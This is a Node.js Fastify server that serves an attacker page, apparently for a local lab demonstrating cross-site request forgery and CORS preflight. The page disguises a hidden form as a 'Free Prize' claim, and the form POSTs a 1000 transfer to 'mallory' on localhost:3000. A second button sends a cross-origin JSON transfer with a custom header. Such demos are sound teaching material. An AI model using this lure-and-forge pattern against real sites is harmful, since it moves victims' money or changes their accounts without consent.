import Fastify from "fastify";

const fastify = Fastify({
  logger: {
    transport: { target: "pino-pretty" },
  },
});

fastify.get("/", function (request, reply) {
  reply.header("Content-Type", "text/html; charset=utf-8").send(`<html>
<head>
  <title>App</title>
</head>
<body>
  <h1>Free Prize</h1>
  <p>Claim your reward below.</p>
  <form method="POST" action="http://localhost:3000/transfer">
    <input type="hidden" name="to" value="mallory" />
    <input type="hidden" name="amount" value="1000" />
    <button type="submit">Claim reward</button>
  </form>

  <hr />
  <h2>Try the non-simple transfer endpoint</h2>
  <p>
    This uses JSON and a custom header, so the browser should send a pre-flight
    request before attempting the cross-origin POST.
  </p>
  <button type="button" id="claim-json-reward">Claim JSON reward</button>
  <pre id="json-result"></pre>

  <script>
    const button = document.getElementById("claim-json-reward");
    const result = document.getElementById("json-result");

    button.addEventListener("click", async () => {
      result.textContent = "Sending cross-origin JSON transfer...";

      try {
        const response = await fetch("http://localhost:3000/transfer-json", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Transfer-Intent": "attacker",
          },
          body: JSON.stringify({ to: "mallory", amount: "1000" }),
        });

        result.textContent = "Response status: " + response.status;
      } catch (error) {
        result.textContent = "Request failed: " + error;
      }
    });
  </script>
</body>
</html>`);
});

fastify.listen({ port: 4000 }, function (err, address) {
  if (err) {
    fastify.log.error(err);
    process.exit(1);
  }
});
